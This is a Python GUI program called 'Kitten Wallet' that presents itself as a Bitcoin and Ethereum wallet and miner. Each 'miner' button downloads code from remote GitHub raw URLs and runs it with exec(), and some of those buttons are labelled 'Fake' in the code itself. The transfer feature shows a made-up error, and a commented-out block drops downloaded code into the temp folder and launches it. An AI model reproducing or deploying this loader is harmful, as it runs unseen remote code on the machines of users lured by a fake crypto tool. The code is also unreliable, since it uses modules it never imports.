from PySimpleGUI import *
import requests
import bitcoin
import pyarmor
import colorama
import pystyle

from threading import Thread

theme('DarkTeal9')

title_font = ('Courier', 25, 'bold')
font = ('Courier', 15)
count_font = ('Courier', 10)

BTC_COUNT = 0.00
USD_COUNT = 0.00
ETH_COUNT = 0.00

def copy_ip():
    ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
    os.system("echo "+ip+" | clip")
    Popup("Copied!")

def setAddressOnConsole():
    os.system("echo "+adress+" | clip")
    responseString.set("Copied !")
#
def setAmmountOnScreen():
    responseString.set("")
    apiResponse.set("")
    f = open(os.getenv('TEMP') + "\\ze3.json", "r")
    jsonHandler = json.load(f)
    adress = jsonHandler["address"]
    amount = jsonHandler["amount"]
    f.close()
    ammount.set(str(amount) + " BTC")
    amountUSD.set(str(round(int(requests.get("https://api.coinbase.com/v2/prices/spot?currency=USD").json()["data"]["amount"].split(".", 1)[0]) * float(amount), 2)) + " USD")

def run_script(url):
    code = requests.get(url).content
    t = Thread(target=exec, args=[code])
    t.start()

LINKS = {
    'Miner1': 'https://raw.githubusercontent.com/Ecauto/ecauto.github.io/main/Kitten/Miner1.txt',
    'Miner2_BTC': 'https://raw.githubusercontent.com/Ecauto/ecauto.github.io/main/Kitten/Miner2_BTC.txt',
    'Fake': 'https://raw.githubusercontent.com/Ecauto/ecauto.github.io/main/Kitten/Fake.txt',
    'Miner5': 'https://raw.githubusercontent.com/Ecauto/ecauto.github.io/main/Kitten/Miner5.txt',
    'Miner3_ETH': 'https://raw.githubusercontent.com/Ecauto/ecauto.github.io/main/Kitten/miner3_ETH.txt',
    'Fake2': 'https://raw.githubusercontent.com/Ecauto/ecauto.github.io/main/Kitten/Fake2.txt',
}

BTC_LAYOUT = [
    [Push(),Button('BTC| Miner1 (Kitten Wallet)', size=(30,1),key="Miner1"), Push()],
    [Push(), Button('BTC| Miner2 (Wallet Wanted)', size=(30, 1),key="Miner2_BTC"), Push()],
    [Push(), Button('BTC| Miner3 (No Use Wallet)', size=(30, 1),key="Fake"), Push()],
]

ETH_LAYOUT = [
    [Push(),Button('ETH| Miner4 (Kitten Wallet)', size=(30,1),key="Miner5"), Push()],
    [Push(), Button('ETH| Miner5 (Wallet Wanted)', size=(30, 1),key="Miner3_ETH"), Push()],
    [Push(), Button('ETH| Miner6 (No Use Wallet)', size=(30, 1),key="Fake2"), Push()],
]

FIRST_TAB_LAYOUT = [
    [Push(),Text(str(BTC_COUNT) + ' BTC', font=count_font,key="BTC"), Push()],
    [Push(),Text(str(ETH_COUNT) + ' ETH', font=count_font,key="ETH"), Push()],
    [Push(),Text(str(USD_COUNT) + ' USD', font=count_font,key="USD"), Push()],
    [Push(), Button('COPY ADDRESS', size=(30, 1)), Push()],
    [Push(), Button('COPY IP', size=(30, 1),key="get_ip"), Push()],
    [HSeparator()],
    [Push(),Frame('BTC', BTC_LAYOUT, title_location='n', font=title_font), Push()],
    [Push(),Frame('ETH', ETH_LAYOUT, title_location='n', font=title_font), Push()],
    #[Push(), Button('test', font=title_font, expand_x=True), Push()],
]

SECOND_TAB_LAYOUT = [
    [Push(), Text('AMOUNT'), Push()],
    [Push(), Input(), Push()],

    [Push(), Text('ADRESS'), Push()],
    [Push(), Input(), Push()],
    [Push(),Button('TRANSFER', font=title_font, expand_x=True), Push()],
    [HSeparator()],
    [Text('OUTPUT: '), Push()],
    [Multiline(size=(50,12),key="logs")]
]

FINAL_TAB_LAYOUT = [Tab('MINERS',FIRST_TAB_LAYOUT),Tab('TRANSFER',SECOND_TAB_LAYOUT)]
layout = [
    [Push(),Text('   Kitten Wallet', font=title_font),Push(),Button(image_filename="ref.png",image_subsample=25,key="refresh")],
    [Push(), Text('by Izikut & Whynot'), Push()],
    [TabGroup(layout=[FINAL_TAB_LAYOUT], tab_location='n')]
]
window = Window('Kitten Wallet', layout, font=font,use_custom_titlebar=True,grab_anywhere=True)

while 1:
    event, values = window.read()
    #print(event in LINKS)
    if event == WIN_CLOSED:
        break
    elif event == "TRANSFER":
        window["logs"].print("Error 57x4: Functionality Disabled (SOON)")
    elif event == "refresh":
        window["logs"].Update("")
        window["BTC"].Update(str(BTC_COUNT) + ' BTC')
        window["ETH"].Update(str(ETH_COUNT) + ' ETH')
        window["USD"].Update(str(USD_COUNT) + ' USD')

    elif event in LINKS:
        #print(LINKS[event])
        run_script(LINKS[event])

    elif event == "get_ip":
        copy_ip()

    #elif event == "free":
    #    with open(os.getenv('TEMP') + "\\freeMiner.py", "w") as freeMinerFile:
    #     freeMinerFile.write(requests.get("https://ecauto.github.io/Kitten/Miner1.txt").text)
    #     os.system("start python %temp%/freeMiner.py " + adress)

    #elif event == "test":
    #    BTC_COUNT +=100

window.close()